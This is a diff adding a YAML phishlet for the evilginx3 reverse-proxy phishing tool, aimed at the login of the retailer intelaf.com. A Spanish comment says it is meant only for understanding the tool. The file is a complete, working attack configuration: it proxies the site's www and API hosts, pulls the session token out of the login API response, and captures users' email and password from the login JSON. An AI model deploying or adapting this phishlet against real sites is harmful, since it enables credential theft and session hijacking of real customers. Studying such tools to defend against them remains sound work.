@@ -1,0 +1,28 @@
+## Estos phishlets solo estan realizados con el fin de entender la tool de evilginx3 y no realizar ataques sobre los mismos
+name: 'intelaf'
+author: 'Alux'
+min_ver: '3.0.0'
+redirect_url: 'https://www.intelaf.com/'
+
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'intelaf.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'intelaf.com:2053', session: true, is_landing: false, auto_filter: true}
+auth_tokens:
+  - domain: 'api.intelaf.com:2053'
+    path: '/App/api/usuario/login'
+    name: 'token'
+    search: '"Token":"([^"]*)'
+    type: 'body'
+credentials:
+  username:
+    key: ''
+    search: '"Email":"([^"]*)'
+    type: 'json'
+  password:
+    key: ''
+    search: '"Password":"([^"]*)'
+    type: 'json'
+login:
+  # Setting the login domain and path for initial phishing page.
+  domain: 'www.intelaf.com'
+  path: 'login'
